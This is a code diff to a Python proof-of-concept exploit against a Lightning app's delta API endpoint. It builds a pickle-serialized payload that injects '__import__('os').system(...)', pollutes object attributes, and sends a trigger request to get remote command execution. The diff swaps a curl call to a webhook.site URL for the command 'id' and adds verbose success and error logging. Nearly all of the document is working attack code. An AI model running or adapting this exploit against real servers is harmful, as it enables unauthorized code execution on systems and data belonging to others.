@@ -49,17 +49,40 @@ class Root:
         return str, (str(self),)
 
 server_host = 'http://127.0.0.1:7501'
-server_host = server_host
-command =  'curl -i https://webhook.site/f28e742d-3a2f-40d0-8072-e22313f20193'
+server_host =  server_host
+command =  'id'
 
 def send_delta(d):
     # this posts a delta to the remote host
     # there is insufficent type checking on this endpoint to ensure serialized data is not sent accross
-    requests.post(server_host + '/api/v1/delta', headers={
-        'x-lightning-type': '1',
-        'x-lightning-session-uuid': '1',
-        'x-lightning-session-id': '1'
-    }, json={"delta": d})
+    print(f"[DEBUG] Sending delta payload...")
+    try:
+        response = requests.post(server_host + '/api/v1/delta', headers={
+            'x-lightning-type': '1',
+            'x-lightning-session-uuid': '1',
+            'x-lightning-session-id': '1'
+        }, json={"delta": d}, timeout=10)
+        
+        print(f"[DEBUG] Response Status Code: {response.status_code}")
+        print(f"[DEBUG] Response Headers: {dict(response.headers)}")
+        
+        if response.status_code != 200:
+            print(f"[ERROR] Server returned non-200 status: {response.status_code}")
+            print(f"[ERROR] Response text: {response.text}")
+        else:
+            print(f"[SUCCESS] Delta accepted with status 200")
+            
+        return response
+        
+    except requests.exceptions.ConnectionError as e:
+        print(f"[ERROR] Connection failed: {e}")
+        return None
+    except requests.exceptions.Timeout as e:
+        print(f"[ERROR] Request timed out: {e}")
+        return None
+    except Exception as e:
+        print(f"[ERROR] Unexpected error: {e}")
+        return None
 
 # this code is injected and ran on the remote host
 injected_code = f"__import__('os').system({command!r})" + '''
@@ -74,6 +97,7 @@ LightningFlow._INTERNAL_STATE_VARS = {"_paths", "_layout"}
 lightning.app.utilities.commands.base._APIRequest = _APIRequest
 del sys.modules['lightning.app.utilities.types']'''
 
+print("[INFO] Building exploit payload...")
 root = Root()
 
 # This is why we add `namedtuple` to the root scope, it provides easy access to the `sys` module
@@ -142,15 +166,32 @@ delta = {
     }
 }
 
+print("[INFO] Serializing payload...")
 # Some replaces to remove some odd quirks of pickle proto 1 
 # We keep proto 1 because it keeps our message utf-8 encodeable
 payload = pickletools.optimize(pickle.dumps(delta, 1)).decode() \
     .replace('__builtin__', 'builtins') \
     .replace('unicode', 'str')
 
-# Sends the payload and does all of our attribute pollution
-send_delta(payload)
+print(f"[INFO] Payload size: {len(payload)} characters")
+print("[INFO] Sending exploit payload...")
 
-# Small delay to ensure payload was processed
-time.sleep(0.2)
-send_delta({}) # Code path triggers when this delta is recieved
+# Sends the payload and does all of our attribute pollution
+response1 = send_delta(payload)
+
+if response1 and response1.status_code == 200:
+    print("[INFO] First payload delivered successfully, waiting before sending trigger...")
+    
+    # Small delay to ensure payload was processed
+    time.sleep(0.2)
+    
+    print("[INFO] Sending trigger delta...")
+    # Code path triggers when this delta is received
+    response2 = send_delta({})
+    
+    if response2 and response2.status_code == 200:
+        print("[SUCCESS] Exploit sequence completed. Check target system for command execution.")
+    else:
+        print("[WARNING] Trigger delta may have failed. Command execution status unknown.")
+else:
+    print("[ERROR] Initial exploit payload failed. Check target availability and configuration.")
